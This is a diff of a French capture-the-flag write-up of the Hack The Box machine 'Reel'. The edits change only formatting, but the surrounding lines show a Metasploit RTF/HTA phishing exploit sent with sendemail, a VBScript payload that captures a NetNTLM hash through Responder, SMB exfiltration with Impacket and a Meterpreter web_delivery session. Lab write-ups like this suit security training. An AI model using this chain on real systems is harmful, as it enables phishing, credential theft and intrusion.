@@ -112,7 +112,7 @@ Cela plus la présence du port SMTP et l'incitation à envoyer un RTF étaient s
 Move It!
 --------
 
-Si on recherche RTF dans Metasploit on trouve entre autres le module *windows/fileformat/office\_word\_hta*. Ce dernier génère un RTF qui provoque le chargement d'un fichier HTA externe. Ce HTA contient des instructions VBA qui seront alors exécutées.  
+Si on recherche RTF dans Metasploit on trouve entre autres le module `windows/fileformat/office_word_hta`. Ce dernier génère un RTF qui provoque le chargement d'un fichier HTA externe. Ce HTA contient des instructions VBA qui seront alors exécutées.  
 
 ```
 msf exploit(windows/fileformat/office_word_hta) > show options
@@ -149,7 +149,7 @@ msf exploit(windows/fileformat/office_word_hta) > exploit -j
 
 On utilise alors *sendemail* pour envoyer le fichier :  
 
-```
+```bash
 sudo sendemail -t nico@megabank.com -u "New procedure" -m "Hi Nicolas. Here is a new procedure" -a /tmp/new procedure.rtf -s 10.10.10.77 -f ariel@megabank.com -v
 ```
 
@@ -164,7 +164,7 @@ msf exploit(windows/fileformat/office_word_hta) >
 [-] 10.10.10.77      office_word_hta - Exception handling request: Powershell command length is greater than the command line maximum (8192 characters)
 ```
 
-Bien sûr les opérations plus basiques fonctionnent... On peut par exemple exfiltrer le hash NetNTLM de l'utilisateur avec le VBA suivant (on garde le même RTF généré par MSF, il nous suffit d'éditer le HTA) :  
+Bien sûr, les opérations plus basiques fonctionnent... On peut par exemple exfiltrer le hash NetNTLM de l'utilisateur avec le VBA suivant (on garde le même RTF généré par MSF, il nous suffit d'éditer le HTA) :  
 
 ```
 <script language="VBScript">
@@ -202,7 +202,7 @@ Responder
 [SMBv2] NTLMv2-SSP Hash     : nico::HTB:a8fcb58a95e93ee4:EC508DB8BA3DCA23F09E7E1FC5CAB0F9:0101000000000000C0653150DE09D201DFD2FBC44BDE3940000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000803EBD2E178E601C3B188621BBDBDAFB4AF51DA31565A1D3D4BD4420D4B777C40A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003200000000000000000000000000
 ```
 
-Malheureusement on ne vas pas bien loin avec ça... le mot de passe est suffisamment costaud :'(   
+Malheureusement on ne va pas bien loin avec ça... le mot de passe est suffisamment costaud :'(   
 
 En utilisant SMB on peut par exemple accéder au premier flag en le copiant simplement chez nous:  
 
@@ -219,7 +219,7 @@ En utilisant SMB on peut par exemple accéder au premier flag en le copiant simp
 
 Pour mettre en place un partage SMB sans trop de prise de tête, *Impacket* est fort utile :  
 
-```
+```console
 devloop@kali:/tmp$ sudo impacket-smbserver public jail/
 Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
 
@@ -239,9 +239,9 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
 [*] Remaining connections []
 ```
 
-Premier flag : fa363aebcfa2c29897a69af385fee971  
+Premier flag : `fa363aebcfa2c29897a69af385fee971`  
 
-Via cette astuce et en utilisant la redirection d'output j'ai pu lister le dossier utilisateur, obtenir des infos sur le système (Microsoft Windows Server 2012 R2 Standard à jour) mais çà ne nous donne pas un shell.  
+Via cette astuce et en utilisant la redirection d'output, j'ai pu lister le dossier utilisateur, obtenir des infos sur le système (Microsoft Windows Server 2012 R2 Standard à jour) mais çà ne nous donne pas un shell.  
 
 AppUnLocker
 -----------
@@ -292,7 +292,7 @@ Il est plus simple d'obtenir [un reverse shell basique](https://gist.github.com/
 </script>
 ```
 
-J'ai finalement pu obtenir via session *Meterpreter* avec *web\_delivery* puis trouver mon bonheur parmi les modules d'énumération locale:  
+J'ai finalement pu obtenir via session *Meterpreter* avec `web_delivery` puis trouver mon bonheur parmi les modules d'énumération locale:  
 
 ```
 msf exploit(multi/script/web_delivery) > show options
@@ -383,7 +383,7 @@ On trouve dans le dossier de notre utilisateur nico un fichier *cred.xml* que vo
 
 Il s'agit en quelque sorte d'un format de sérialisation pour un identifiant utilisable dans Powershell. Tenter de copier le fichier pour l'utiliser localement semble assez compliqué, d'abord parce qu'il est lié à d'autres clés RSA présentes sur la machine et visiblement un simple copier / coller ne suffit pas... J'ai pas cherché à aller plus loin.  
 
-```
+```console
 devloop@kali:~/Documents$ ssh nico@10.10.10.77
 The authenticity of host '10.10.10.77 (10.10.10.77)' can't be established.
 ECDSA key fingerprint is SHA256:jffiqnVqz/MrcDasdsjISFIcN/xtlDj1C76Yu1mDQVY.
@@ -437,7 +437,7 @@ Go On Move
 Le plus intéressant une fois connecté avec Tom c'est la présence d'une note laissé dans un dossier *AD Audit* :  
 
 ```
-tom@REEL C:\Users\tom\Desktop\AD Audit>type note.txt                                                                            
+tom@REEL C:\Users\tom\Desktop\AD Audit> type note.txt                                                                            
 Findings:                                                                                                                       
 
 Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).                                  
@@ -577,7 +577,7 @@ Plusieurs scripts Powershell sont présents dans un sous-dossier *Backup Scripts
 
 J'ai eu la bonne idée de faire un diff sur les fichiers ps1 présents et ceux du zip :  
 
-```
+```console
 devloop@kali:~/Documents/reel/Backup Scripts$ diff BackupScript.ps1 yolo/BackupScript.ps1
 1,2c1,41
 < # admin password
